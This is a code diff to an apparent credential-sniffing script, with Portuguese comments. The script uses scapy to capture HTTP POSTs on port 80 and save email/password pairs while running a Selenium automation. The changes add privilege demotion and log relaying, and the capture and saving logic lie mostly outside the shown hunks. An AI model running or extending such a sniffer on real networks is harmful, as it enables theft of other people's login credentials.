@@ -3,6 +3,7 @@ import sys
 from scapy.all import sniff, Raw
 from urllib.parse import unquote
 import subprocess
+import threading
 
 # Define caminhos absolutos para evitar erros no subprocesso
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -17,6 +18,33 @@ else:
     # Caminho manual caso não esteja ativo o venv no shell atual
     python_exec = os.path.join(BASE_DIR, ".venv/bin/python")
 
+def get_demote_function():
+    """
+    Retorna uma função que configura o UID/GID para o usuário original
+    que chamou o sudo. Isso impede que o Firefox rode como root.
+    """
+    uid = os.environ.get('SUDO_UID')
+    gid = os.environ.get('SUDO_GID')
+
+    if uid and gid:
+        def demote():
+            os.setgid(int(gid))
+            os.setuid(int(uid))
+
+        return demote
+    return None
+
+def monitorar_logs_selenium(proc):
+    """ Corrige o bug visual de 'escada' nos logs """
+    while True:
+        line = proc.stdout.readline()
+        if not line and proc.poll() is not None:
+            break
+        if line:
+            texto = line.strip()
+            if texto:
+                sys.stdout.write(f"{texto}\r\n")
+                sys.stdout.flush()
 
 def salvar_credenciais(email, senha):
     """
@@ -73,11 +101,24 @@ def processar(pacote):
 print(f"[*] Iniciando automação Selenium com: {python_exec}")
 script_automacao = os.path.join(BASE_DIR, "selenium_automation.py")
 
+demote_fn = get_demote_function()
+
 # Popen sem pipes para que o Selenium possa usar o stdout se necessário,
 # ou use pipes se quiser silenciar.
-proc = subprocess.Popen([python_exec, script_automacao])
-
+proc = subprocess.Popen(
+    [python_exec, script_automacao],
+    stdout=subprocess.PIPE,
+    stderr=subprocess.STDOUT,
+    text=True,
+    bufsize=1,
+    preexec_fn=demote_fn,  # <--- MÁGICA AQUI: O Selenium roda como seu usuário, não root
+    cwd=BASE_DIR           # Garante que o diretório de trabalho seja o correto
+)
 print("[*] Sniffer ativo. Aguardando POSTs...")
+
+t = threading.Thread(target=monitorar_logs_selenium, args=(proc,), daemon=True)
+t.start()
+
 try:
     sniff(filter="tcp port 80", prn=processar, store=False)
 except KeyboardInterrupt:
